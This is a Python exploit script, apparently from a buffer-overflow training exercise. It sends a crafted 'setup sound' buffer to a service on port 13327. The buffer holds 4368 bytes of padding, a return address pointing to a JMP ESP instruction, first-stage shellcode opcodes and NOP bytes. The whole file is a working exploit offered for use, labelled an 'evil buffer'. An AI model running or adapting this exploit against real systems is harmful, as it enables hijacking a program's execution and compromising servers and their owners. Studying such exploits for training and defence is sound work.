#!/usr/bin/python
import socket

host = "127.0.0.1"

# 4368 = front pad | ret = bytes in EIP | "\x83\xC0\x0C\xFF\xE0" = First Stage Shellcode Opcodes | 2 = NOP tail pad
# ret now contains the address to a JMP ESP instruction
ret = "\x96\x45\x13\x08"
crash = "\x41"*4368 + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90"*2

# \x90\x00# = bytes that terminate the buffer
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")
s.connect((host, 13327))
s.send(buffer)
data = s.recv(1024)
print(data)
s.close()
print("[*] Payload sent")
